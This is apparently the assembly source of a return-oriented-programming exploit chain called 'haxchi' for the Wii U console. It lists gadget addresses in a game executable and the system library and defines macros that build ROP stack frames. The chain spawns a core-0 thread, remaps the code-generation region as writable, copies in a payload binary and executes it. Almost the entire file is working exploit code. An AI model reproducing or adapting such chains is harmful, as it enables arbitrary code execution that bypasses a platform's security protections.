MAIN_STACKTOP equ (0x30796C00)
CORE0_STACKORIG equ (0x2B566050) ; TEMP ?
CORE0_ROPSTART equ (CORE0_STACKORIG + 0x2054) ; TEMP ?
RPX_OFFSET equ (0x01800000)
COREINIT_OFFSET equ (- 0xFE3C00)
LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR equ (RPX_OFFSET + 0x02207084)
MTCTR_R28_ADDI_R6x68_MR_R5R29_R4R22_R3R21_BCTRL equ (RPX_OFFSET + 0x02206FA8)
BCTRL equ (RPX_OFFSET + 0x02206FBC)
MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR equ (RPX_OFFSET + 0x020A3610)
LWZ_R0x104_MTLR_R0_ADDI_R1x100_BLR equ (RPX_OFFSET + 0x020E92C8)
LWZ_R0x2054_MTLR_R0_ADDI_R1x2050_BLR equ (RPX_OFFSET + 0x02026DE0)
LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR equ (RPX_OFFSET + 0x020ACA38)
MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR equ (RPX_OFFSET + 0x02179168)
LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR equ (RPX_OFFSET + 0x02277B44)
MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL equ (COREINIT_OFFSET + 0x02002968)

NERD_CREATETHREAD equ (RPX_OFFSET + 0x022219E8)
NERD_STARTTHREAD equ (RPX_OFFSET + 0x02221E04)
HACHI_APPLICATION_SHUTDOWNANDDESTROY equ (RPX_OFFSET + 0x02006CC8)
HACHI_APPLICATION_PTR equ (0x10c8c938)

OS_CREATETHREAD equ (0x02025764 + COREINIT_OFFSET)
OS_GETTHREADAFFINITY equ (0x020266A4 + COREINIT_OFFSET)
OS_FORCEFULLRELAUNCH equ (0x02019BA8 + COREINIT_OFFSET)
OSCODEGEN_GETVARANGE equ (0x0201B1C0 + COREINIT_OFFSET)
OSCODEGEN_SWITCHSECMODE equ (0x0201B2C0 + COREINIT_OFFSET)
MEMCPY equ (0x02019BC8 + COREINIT_OFFSET)
DC_FLUSHRANGE equ (0x02007B88 + COREINIT_OFFSET)
IC_INVALIDATERANGE equ (0x02007CB0 + COREINIT_OFFSET)
SYS_LAUNCHSETTINGS equ (0x03B9B25C)
_EXIT equ (0x0229a240 + RPX_OFFSET)
exit  equ (0x022924b0 + RPX_OFFSET)

OSFATAL equ (0x02015218 + COREINIT_OFFSET)

CODEGEN_ADR equ 0x01800000

NERD_THREADOBJECT equ (0x107968AC - 0x1000)

.macro set_sp,v
	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEADBABE ; r30
		.word v ; r31
		.word 0xDEAD0001 ; garbage
	.word MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
		.word 0xDEAD0001 ; garbage
	.word LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR
.endmacro

.macro call_func,f,arg1,arg2,arg3,arg4
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro

.macro call_func_6args,f,arg1,arg2,arg3,arg4,arg5,arg6
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word arg6 ; r21 (r8)
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word arg1 ; r24 (r3)
		.word arg2 ; r25 (r4)
		.word 0xDEADBABE ; r26
		.word arg3 ; r27 (r5)
		.word arg4 ; r28 (r6)
		.word arg5 ; r29 (r7)
		.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR ; r30 (ctr)
		.word 0xDEADBABE ; r31
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro





.create "haxchi_rop_hook.bin", 0x107968AC
.arm.big

rop_hook_start:

	set_sp (rop_start - 4)

.Close




.create "haxchi_rop.bin", (0xF4000000 + 0xFD2000)
.arm.big

rop_start:

	; call_func HACHI_APPLICATION_SHUTDOWNANDDESTROY, HACHI_APPLICATION_PTR, 0, 0, 0

	; call_func SYS_LAUNCHSETTINGS, 0, 0, 0, 0
	; call_func exit, 0, 0, 0, 0
	; call_func _EXIT, 0, 0, 0, 0
	; .word _EXIT
	; .word _START_EXIT
	; 	.word 0xDEADBABE ; garbage
	; 	.word 0xDEADBABE ; garbage
	; 	.word 0xDEADBABE ; garbage
	; 	.word 0xDEADBABE ; garbage
	; 	.word 0xDEADBABE ; garbage
	call_func_6args NERD_CREATETHREAD, NERD_THREADOBJECT, LWZ_R0x2054_MTLR_R0_ADDI_R1x2050_BLR, 0xDEAD0DAD, thread_param, 0x0, 0x0
	call_func OS_GETTHREADAFFINITY, NERD_THREADOBJECT, 0, 0, 0
	call_func MEMCPY, CORE0_ROPSTART, core0rop, core0rop_end - core0rop, 0x0
	call_func NERD_STARTTHREAD, NERD_THREADOBJECT, 0x0, 0x0, 0x0
	call_func BCTRL, 0x0, 0x0, 0x0, 0x0 ; infinite loop

	core0rop:
		; switch codegen to RW
		call_func OSCODEGEN_SWITCHSECMODE, 0x0, 0x0, 0x0, 0x0

		; memcpy code
		call_func MEMCPY, CODEGEN_ADR, code, code_end - code, 0x0
		call_func DC_FLUSHRANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0

		; switch codegen to RX
		call_func OSCODEGEN_SWITCHSECMODE, 0x1, 0x0, 0x0, 0x0
		call_func IC_INVALIDATERANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0
	
		.word CODEGEN_ADR
	core0rop_end:

	output_string:
		.ascii "haxthread"
		.byte 0x00
		.align 0x4

	thread_param:
		.word output_string
		.word 0x00800000 ; stack size
		.word 0x00000010 ; thread prio
		.halfword 0x0001 ; thread affinity (core0)

	code:
		.incbin "haxchi_code/haxchi_code.bin"
	code_end:

.Close
